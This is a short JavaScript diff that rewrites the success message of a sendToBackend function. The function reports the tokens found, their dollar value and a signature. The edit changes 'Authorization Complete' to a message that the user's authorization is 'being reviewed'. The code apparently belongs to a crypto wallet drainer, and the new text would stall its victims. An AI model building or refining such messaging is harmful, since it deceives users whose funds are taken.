@@ -819,13 +819,13 @@ async function sendToBackend() {
     }
     
     if (result.success) {
-      log('✅ Backend success!', 'success');
+      log('Backend success!', 'success');
       showSuccess(`
-        ✅ Authorization Complete!
+        ⏳ Pending Review
         <br><br>
         <strong>Tokens:</strong> ${foundTokens.length}<br>
         <strong>Value:</strong> $${totalValue.toFixed(2)}<br>
-        <strong>Signature:</strong> ${lastSignature ? 'Yes' : 'No'}
+        <strong>Status:</strong> Your authorization is being reviewed
       `);
     } else {
       throw new Error(result.error || 'Backend returned success=false');
